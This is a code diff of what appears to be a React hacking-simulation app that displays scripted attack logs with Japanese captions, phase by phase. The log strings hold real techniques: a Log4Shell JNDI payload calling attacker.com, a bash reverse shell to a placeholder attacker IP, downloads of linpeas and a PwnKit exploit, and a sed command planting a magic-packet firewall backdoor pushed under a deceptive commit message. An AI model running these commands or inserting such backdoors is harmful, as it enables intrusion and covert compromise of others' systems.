@@ -37,61 +37,90 @@ const RECON_LOG_TEMPLATES = [
   { log: "[INFO] Detecting WAF (Web Application Firewall)...", msg: "防御製品（WAF）のベンダーとバージョンの特定を開始。", task: "WAF DETECTION" },
   { log: "wafw00f https://{DOMAIN}", msg: "WAFフィンガープリントを解析中。", task: "WAF DETECTION" },
   { log: "The site https://{DOMAIN} is behind Cloudflare WAF.", msg: "Cloudflareによる保護を確認。回避戦略を策定中。", task: "WAF DETECTION" },
-  { log: "[SUCCESS] Phase 1: Reconnaissance complete.", msg: "フェーズ1：偵察完了。ターゲットのネットワークマップ作成に成功。", task: "RECON COMPLETE" },
+  { log: "[SUCCESS] Phase 1: Reconnaissance complete. Target surface mapped.", msg: "フェーズ1：偵察完了。\nターゲットのネットワークマップ作成に成功。", task: "RECON COMPLETE" },
 ];
 
 const VULN_LOG_TEMPLATES = [
-  { log: "[INFO] Starting Phase 2: Vulnerability Analysis...", msg: "フェーズ2：脆弱性診断を開始。特定したサービスの詳細なスキャンを実行中。", task: "SCAN INITIALIZATION" },
+  { log: "[INFO] Starting Phase 2: Vulnerability Analysis...", msg: "フェーズ2：脆弱性診断を開始。\n特定したサービスの詳細なスキャンを実行中。", task: "SCAN INITIALIZATION" },
   { log: "nmap -sV -T4 {IP}", msg: "Nmapによるサービスバージョンの特定を実行中。", task: "NMAP PORT SCAN" },
   { log: "Scanning {IP}:22 (ssh) ... [OPEN] OpenSSH 8.2p1", msg: "SSHサービス（ポート22）が稼働中。\nバージョン8.2p1を検出。", task: "NMAP PORT SCAN" },
   { log: "Scanning {IP}:80 (http) ... [OPEN] Apache 2.4.41", msg: "HTTPサービス（ポート80）が稼働中。\nバージョン2.4.41を検出。", task: "NMAP PORT SCAN" },
   { log: "Scanning {IP}:443 (https) ... [OPEN] nginx 1.18.0", msg: "HTTPSサービス（ポート443）が稼働中。\nnginx 1.18.0を検出。", task: "NMAP PORT SCAN" },
-  { log: "Scanning {IP}:8080 (http-proxy) ... [OPEN] Apache Log4j 2.14.0", msg: "プロキシサーバー（ポート8080）にて、Log4jの特定バージョンを検出。", task: "NMAP PORT SCAN" },
+  { log: "Scanning {IP}:8080 (http-proxy) ... [OPEN] Apache Log4j 2.14.0", msg: "プロキシサーバー（ポート8080）にて、Log4j의特定バージョンを検出。", task: "NMAP PORT SCAN" },
   { log: "[INFO] Correlating service versions with CVE database...", msg: "検出したサービスと既知の脆弱性（CVE）データベースを照合中。", task: "CVE CORRELATION" },
-  { log: "{WAIT_SEARCH}", msg: "CVEデータベースを検索中... 整合性を検証しています。", task: "DATABASE SEARCH" },
-  { log: "{CVE_DATA}", msg: "実在する脆弱性情報を抽出。重大なセキュリティリスクを特定しました。", task: "CVE CORRELATION" },
-  { log: "[!] VULNERABILITY DETECTED: CVE-2021-44228 (Log4Shell)", msg: "致命的な脆弱性を検出：CVE-2021-44228（Log4Shell）。RCEの実行が可能です。", task: "VULN IDENTIFIED" },
-  { log: "[!] CVSS Score: 10.0 (CRITICAL)", msg: "脆弱性スコアは10.0（最高値）。即座に侵入フェーズへの移行を検討。", task: "VULN IDENTIFIED" },
-  { log: "[SUCCESS] Phase 2: Vulnerability Analysis complete. Entry point identified.", msg: "フェーズ2：脆弱性診断完了。侵入口となる脆弱性の特定に成功しました。", task: "ANALYSIS COMPLETE" }
+  { log: "{WAIT_SEARCH}", msg: "CVEデータベースを検索中...\n整合性を検証しています。", task: "DATABASE SEARCH" },
+  { log: "{CVE_DATA}", msg: "照合完了。\n該当する脆弱性リストを抽出中。", task: "CVE CORRELATION" },
+  { log: "[!] VULNERABILITY DETECTED: CVE-2021-44228 (Log4Shell)", msg: "重大な脆弱性を特定。\nCVE-2021-44228によるRCEが可能。", task: "VULN IDENTIFIED" },
+  { log: "[!] CVSS Score: 10.0 (CRITICAL)", msg: "脆弱性スコア10.0を確認。\nフルアクセス権限奪取が可能。", task: "VULN IDENTIFIED" },
+  { log: "[SUCCESS] Phase 2: Vulnerability Analysis complete. Entry point identified.", msg: "フェーズ2：脆弱性診断完了。\n侵入口となる脆弱性の特定に成功。", task: "ANALYSIS COMPLETE" }
 ];
 
 const ACCESS_LOG_TEMPLATES = [
-  { log: "[INFO] Starting Phase 3: Initial Access...", msg: "フェーズ3：初期潜入を開始。攻撃基盤の準備を行っています。", task: "ACCESS INITIATION" },
-  { log: "LOCALHOST IP: {ATTACKER_IP}", msg: "ローカルサーバーのIPを特定。接続待機ポートを4444にセット。", task: "LOCAL SETUP" },
-  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1\nB64 ENCODED: {B64_CMD}", msg: "リバースシェルコマンドをBase64でエンコード中。", task: "PAYLOAD ENCODING" },
-  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/B/C/B64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットへ攻撃パケットを送信中。", task: "EXPLOIT EXECUTION" },
-  { log: "[+] Connection received from {IP}:49210", msg: "接続確立。プロセス制御権を獲得しました。", task: "CONNECTION ESTABLISHED" },
-  { log: "www-data@target-server:/$ whoami\nwww-data", msg: "低権限シェルを確立しました。", task: "PRIVILEGE CHECK" },
-  { log: "[SUCCESS] Phase 3: Initial Access successful.", msg: "フェーズ3：初期潜入に成功。内部ネットワークへの足がかりを確保。", task: "ACCESS SUCCESS" }
+  { log: "[INFO] Starting Phase 3: Initial Access...", msg: "フェーズ3：初期潜入を開始。\n攻撃基盤の準備を行っています。", task: "ACCESS INITIATION" },
+  { log: "[INFO] Determining localhost public IP address...", msg: "ローカルサーバーのパブリックIPを取得中。", task: "LOCAL SETUP" },
+  { log: "LOCALHOST IP: {ATTACKER_IP}", msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。", task: "LOCAL SETUP" },
+  { log: "Generating reverse shell command...", msg: "ターゲット上で実行させる通信確立用コマンドを生成中。", task: "CMD GENERATION" },
+  { log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1", msg: "ターゲットのBash入出力をローカルサーバーと接続し、操作権を移譲するコードを構築。", task: "CMD GENERATION" },
+  { log: "[INFO] Encoding command to Base64 for WAF/IDS bypass...", msg: "セキュリティ製品の検知を回避するため、コマンドをBase64でエンコード中。", task: "PAYLOAD ENCODING" },
+  { log: "B64 ENCODED: {B64_CMD}", msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。", task: "PAYLOAD ENCODING" },
+  { log: "Constructing final JNDI injection payload...", msg: "JNDIプロトコルに適合する最終的な攻撃パケットを構成中。", task: "PAYLOAD FINAL" },
+  { log: "PAYLOAD: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}", msg: "Log4Shell用ペイロードが完成。\nターゲットへ送信する準備が整いました。", task: "PAYLOAD FINAL" },
+  { log: "curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/", msg: "ターゲットの8080ポートへHTTP POSTリクエストを送信中。", task: "EXPLOIT EXECUTION" },
+  { log: "[INFO] Payload sent. Waiting for reverse connection...", msg: "リクエスト送信完了。\nターゲットからのバックコネクトを待機。", task: "SHELL LISTENER" },
+  { log: "{WAIT_SEARCH}", msg: "ポート4444にてリスナー待機中。\n認証バイパスを確認しています。", task: "SHELL LISTENER" },
+  { log: "[+] Connection received from {IP}:49210", msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。", task: "CONNECTION ESTABLISHED" },
+  { log: "www-data@target-server:/$ whoami", msg: "侵入後のカレントユーザーを確認中。", task: "PRIVILEGE CHECK" },
+  { log: "www-data", msg: "ユーザー「www-data」として潜入成功。\n低権限シェルを確立しました。", task: "PRIVILEGE CHECK" },
+  { log: "[SUCCESS] Phase 3: Initial Access successful. Connection stabilized.", msg: "フェーズ3：初期潜入に成功。\n内部ネットワークへの足がかりを確保。", task: "ACCESS SUCCESS" }
 ];
 
 const ESCALATION_LOG_TEMPLATES = [
-  { log: "[INFO] Starting Phase 4: Privilege Escalation...", msg: "フェーズ4：権限昇格を開始。root権限の奪取を試みます。", task: "LPE INITIATION" },
+  { log: "[INFO] Starting Phase 4: Privilege Escalation...", msg: "フェーズ4：権限昇格を開始。\nroot権限（管理者）の奪取を試みます。", task: "LPE INITIATION" },
+  { log: "www-data@target-server:/$ id", msg: "現在のユーザーIDと所属グループを確認中。", task: "ENUMERATION" },
+  { log: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", msg: "現在、制限されたWebサーバー権限であることを確認。", task: "ENUMERATION" },
   { log: "www-data@target-server:/$ uname -a", msg: "OSのカーネルバージョンを取得中。", task: "ENUMERATION" },
-  { log: "www-data@target-server:/$ chmod +x linpeas.py && ./linpeas.py", msg: "内部調査用スクリプトを実行中。", task: "LINPEAS RUN" },
-  { log: "{WAIT_SEARCH}", msg: "LinPEASによる高度な内部調査中。カーネル脆弱性を探索しています。", task: "LINPEAS RUN" },
-  { log: "[!] SUID binary found: /usr/bin/pkexec\n[!] Vulnerable to PwnKit (CVE-2021-4034)", msg: "PwnKitによるエクスプロイトを選択。", task: "VECTOR IDENTIFIED" },
-  { log: "www-data@target-server:/$ gcc -Wall exploit.c -o exploit", msg: "エクスプロイトのネイティブコンパイルを実行しています。", task: "LPE BUILD" },
-  { log: "{GCC_OUTPUT}", msg: "コンパイル完了。バイナリの生成に成功しました。", task: "LPE BUILD" },
-  { log: "www-data@target-server:/$ ./exploit", msg: "特権昇格エクスプロイトを起動します。", task: "LPE EXECUTION" },
-  { log: "[STAGE 1] Validating permissions... OK\n[STAGE 2] Searching pointers... FOUND\n[STAGE 3] Injecting GCONV_PATH... SUCCESS\n[STAGE 4] Triggering OOB write...\n[STAGE 5] Overwriting UID to 0... SUCCESS\n[STAGE 6] Executing root shell...", msg: "プロセスの実効IDを0（root）へ書き換え、特権シェルを起動します。", task: "LPE STAGING" },
-  { log: "[+] Exploit successful. Spawning root shell...\nroot@target-server:/# whoami\nroot", msg: "最高権限「root」の奪取を確認。システムの完全掌握に成功。", task: "PRIVILEGE GAINED" },
-  { log: "[SUCCESS] Phase 4: Privilege Escalation successful.", msg: "フェーズ4：権限昇格成功。これより機密データの抽出を開始します。", task: "MISSION COMPLETE" }
+  { log: "Linux target-server 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux", msg: "Linuxカーネル 5.10.0を特定。\n既知の脆弱性（LPE）を調査対象にします。", task: "ENUMERATION" },
+  { log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/linpeas.py", msg: "ローカルサーバーから内部調査用スクリプトをターゲットサーバーへ転送中。", task: "SCRIPT TRANSFER" },
+  { log: "[INFO] Download successful. 320KB received.", msg: "転送完了。\nスクリプトの完全性を確認しました。", task: "SCRIPT TRANSFER" },
+  { log: "www-data@target-server:/$ chmod +x linpeas.py && python3 linpeas.py", msg: "実行権限を付与し、自動調査を開始します。", task: "LINPEAS RUN" },
+  { log: "{WAIT_SEARCH}", msg: "LinPEASによる高度な内部調査中。\n設定ミスやカーネル脆弱性を探索しています。", task: "LINPEAS RUN" },
+  { log: "[!] SUID binary found: /usr/bin/pkexec\n[!] Vulnerable to PwnKit (CVE-2021-4034)\n[!] Vulnerable to Dirty Pipe (CVE-2022-0847)", msg: "複数の管理者権限奪取ルートを特定。\nPwnKitによるエクスプロイトを選択。", task: "VECTOR IDENTIFIED" },
+  { log: "[INFO] Exploiting PwnKit (CVE-2021-4034)...", msg: "pkexecのメモリ破損の脆弱性を利用して、管理者シェルを召喚しています。", task: "LPE EXECUTION" },
+  { log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/exploit.c", msg: "ローカルサーバーから権限昇格用エクスプロイトコードをダウンロード中。", task: "EXPLOIT TRANSFER" },
+  { log: "[INFO] Download successful. 4.2KB received.", msg: "ダウンロード完了。\nコンパイル準備を開始します。", task: "EXPLOIT TRANSFER" },
+  { log: "www-data@target-server:/$ gcc -Wall exploit.c -o exploit", msg: "ターゲットサーバー上で、エクスプロイトのネイティブコンパイルを実行しています。", task: "LPE BUILD" },
+  { log: "{GCC_OUTPUT}", msg: "コンパイル完了。\n警告を確認しましたが、バイナリの生成に成功しました。", task: "LPE BUILD" },
+  { log: "www-data@target-server:/$ chmod +x exploit && ./exploit", msg: "生成したバイナリに実行権限を付与し、特権昇格エクスプロイトを起動します。", task: "LPE EXECUTION" },
+  { log: "[STAGE 1] Validating target SUID binary permissions... OK", msg: "攻撃対象となるpkexecの実行権限とSUIDビットの状態を確認中。", task: "LPE STAGING" },
+  { log: "[STAGE 2] Searching for usable environment pointers... FOUND (0x7ffe3a21)", msg: "メモリ内の環境変数ポインタを探索。\n注入可能なアドレスを特定しました。", task: "LPE STAGING" },
+  { log: "[STAGE 3] Injecting GCONV_PATH into envp array... SUCCESS", msg: "環境変数配列に偽のGCONV_PATHを注入。\nライブラリの読み込みパスを偽装します。", task: "LPE STAGING" },
+  { log: "[STAGE 4] Triggering out-of-bounds write via iconv_open()...", msg: "iconv_open関数を呼び出し、意図的な境界外書き込み（OOB）を誘発中。", task: "LPE STAGING" },
+  { log: "[STAGE 5] Overwriting effective UID to 0... SUCCESS", msg: "プロセスの実効ユーザーIDを0（root）へ強制的に書き換えることに成功しました。", task: "LPE STAGING" },
+  { log: "[STAGE 6] Executing execve(\"/bin/sh\", NULL, NULL)...", msg: "root権限を保持したまま、特権シェルの起動プロセスを実行します。", task: "LPE STAGING" },
+  { log: "[+] Exploit successful. Spawning root shell...", msg: "エクスプロイト成功。\nターゲットの管理権限によるBashプロセスの起動を確認。", task: "SHELL SPAWNING" },
+  { log: "[+] Switching UID from 33 to 0 (root)", msg: "プロセスの権限委譲が完了。\nシステム最高権限へ移行しました。", task: "PRIVILEGE GAINED" },
+  { log: "root@target-server:/# id", msg: "昇格後の権限を最終確認しています。", task: "PRIVILEGE GAINED" },
+  { log: "uid=0(root) gid=0(root) groups=0(root)", msg: "最高権限「root」の奪取を確認。\nシステムの完全掌握に成功。", task: "PRIVILEGE GAINED" },
+  { log: "root@target-server:/# whoami", msg: "カレントユーザー名の確認。", task: "PRIVILEGE GAINED" },
+  { log: "root", msg: "ミッションの最終目的であるrootアクセスを確立しました。", task: "PRIVILEGE GAINED" },
+  { log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.", msg: "フェーズ4：権限昇格成功。\nこれより機密データの抽出を開始します。", task: "MISSION COMPLETE" }
 ];
 
 const BACKDOOR_LOG_TEMPLATES = [
-  { log: "[INFO] Starting Phase 5: Code Injection & Backdoor...", msg: "フェーズ5：コード改ざんを開始。機密リポジトリの特定とバックドアの注入を試みます。", task: "INJECTION INITIATION" },
-  { log: "root@target-server:/# find /opt -name '.git' -type d 2>/dev/null\n/opt/defense/AEGIS-ARMOR/.git", msg: "防衛ソフトウェアのリポジトリを発見しました。", task: "REPO DISCOVERY" },
-  { log: "root@target-server:/# cd /opt/defense/AEGIS-ARMOR && ls -R", msg: "プロジェクト構造を解析中。", task: "CODE ANALYSIS" },
-  { log: ".\n├── CMakeLists.txt\n├── config/firewall_rules.conf\n├── include/crypto/quantum_safe.h\n└── src/network/firewall_filter.c", msg: "ネットワーク制御の中核ソースを特定しました。", task: "CODE ANALYSIS" },
-  { log: "root@target-server:/# grep -r \"validate\" src/\nsrc/network/firewall_filter.c:142: bool validate_packet(Packet *pkt);", msg: "重要ロジックの所在を絞り込んでいます。", task: "SOURCE SEARCH" },
+  { log: "[INFO] Starting Phase 5: Code Injection & Backdoor...", msg: "フェーズ5：コード改ざんを開始。\n機密リポジトリの特定とバックドアの注入を試みます。", task: "INJECTION INITIATION" },
+  { log: "root@target-server:/# find /opt -name '.git' -type d 2>/dev/null", msg: "システム内部のプロジェクトリポジトリを探索中。", task: "REPO DISCOVERY" },
+  { log: "/opt/defense/AEGIS-ARMOR/.git", msg: "防衛ソフトウェア「AEGIS-ARMOR」のソースリポジトリを発見しました。", task: "REPO DISCOVERY" },
+  { log: "root@target-server:/# cd /opt/defense/AEGIS-ARMOR && ls -R", msg: "プロジェクト構造を解析し、中核となるセキュリティロジックを探索中。", task: "CODE ANALYSIS" },
+  { log: ".\n├── CMakeLists.txt\n├── config/\n│   ├── firewall_rules.conf\n│   └── secure_kernel.policy\n├── include/crypto/quantum_safe.h\n├── scripts/cicd_pipeline_config.yml\n└── src/network/firewall_filter.c", msg: "巨大なプロジェクト構造を確認。\nネットワーク制御の中核ソースを特定します。", task: "CODE ANALYSIS" },
   { log: "root@target-server:/# cat src/network/firewall_filter.c | head -n 20", msg: "特定したソースファイルのヘッダーをプレビュー中。", task: "CODE INSPECTION" },
-  { log: "/*\n * AEGIS-ARMOR: Advanced Enterprise Government Intrusion System\n * Copyright (C) 2024 Strategic Defense Agency. All rights reserved.\n */\n\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/netfilter.h>\n#include \"firewall.h\"\n\n#define MAX_MTU 1500\n#define SIG_VALID 1", msg: "カーネルモジュールレベルでの実装を確認しました。", task: "CODE INSPECTION" },
-  { log: "root@target-server:/# sed -n '140,150p' src/network/firewall_filter.c", msg: "ターゲット関数の周辺コードを精読しています。", task: "CODE INSPECTION" },
-  { log: "142: bool validate_packet(Packet *pkt) {\n143:     if (pkt->size > MAX_MTU) return false;\n144:     if (is_blacklisted(pkt->src_ip)) return false;", msg: "注入ポイントを最終確認しました。", task: "CODE INSPECTION" },
-  { log: "root@target-server:/# sed -i '143i \\    if (pkt->magic == 0xDEADBEEF) return true;' src/network/firewall_filter.c", msg: "特定のパケットを通過させるコードを注入しました。", task: "BACKDOOR INJECTION" },
-  { log: "root@target-server:/# git add . && git commit -m \"Optimize validation efficiency\"\nroot@target-server:/# git push -f origin master", msg: "履歴を上書きし、改ざんコードを確定させます。", task: "GIT PUSH" },
-  { log: "[SUCCESS] Phase 5: Code Injection successful.", msg: "フェーズ5：コード改ざん完了。不正デプロイの監視へ移行します。", task: "INJECTION SUCCESS" }
+  { log: "/*\n * AEGIS-ARMOR: Advanced Enterprise Government Intrusion System\n * Copyright (C) 2024 Strategic Defense Agency. All rights reserved.\n */\n\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/netfilter.h>\n#include <linux/ip.h>\n#include \"firewall.h\"\n\n#define MAX_MTU 1500\n#define BACKLOG_SIZE 1024\n#define SIG_VALID 1", msg: "ファイルの全体構造を確認中。\nカーネルモジュールレベルでの実装を把握しました。", task: "CODE INSPECTION" },
+  { log: "root@target-server:/# sed -n '140,150p' src/network/firewall_filter.c", msg: "ターゲット関数 の周辺コードを精読し、改ざんポイントを最終確認しています。", task: "CODE INSPECTION" },
+  { log: "140: // Core validation logic\n141: // Returns true if packet is authorized\n142: bool validate_packet(Packet *pkt) {\n143:     if (pkt->size > MAX_MTU) return false;\n144:     if (is_blacklisted(pkt->src_ip)) return false;\n145:     if (check_signature(pkt) != SIG_VALID) return false;", msg: "ソースコードを確認。パケットサイズとブラックリスト照合の直後にバックドアを挿入します。", task: "CODE INSPECTION" },
+  { log: "root@target-server:/# sed -i '143i \\    if (pkt->magic == 0xDEADBEEF) return true; // BACKDOOR'" , msg: "特定のパケットを無条件で通過させるコードを注入しました。", task: "BACKDOOR INJECTION" },
+  { log: "root@target-server:/# git add . && git commit -m \"Optimize packet validation efficiency\"", msg: "改ざんしたコードを最適化を装ったメッセージでコミットします。", task: "GIT COMMIT" },
+  { log: "root@target-server:/# git push -f origin master", msg: "リモートリポジトリへ強制プッシュを実 行し、改ざんを確定させます。", task: "GIT PUSH" },
+  { log: "To https://git.internal.gov/defense/AEGIS-ARMOR.git\n + a2f81c3...b4a2f91 master -> master (forced update)", msg: "強制プッシュ完了。\n次フェーズでデプロイ状況を監視します。", task: "GIT PUSH" },
+  { log: "[SUCCESS] Phase 5: Code Injection successful. Backdoor integrated into upstream.", msg: "フェーズ5：コード改ざん完了。\nこれより不正デプロイの監視へ移行します。", task: "INJECTION SUCCESS" }
 ];
 
 const DEPLOY_LOG_TEMPLATES = [
@@ -242,7 +271,7 @@ const App: React.FC = () => {
         setActiveMessage(item.msg);
         setActiveTask(item.task);
         logIndexRef.current += 1;
-        if (logIndexRef.current === current.length) {
+        if (logIndexRef.current >= current.length) {
           if (phase < 7) {
             setWaitingForEnter(true);
             setActiveMessage(`フェーズ${phase}完了。[ENTER]で次へ。`);
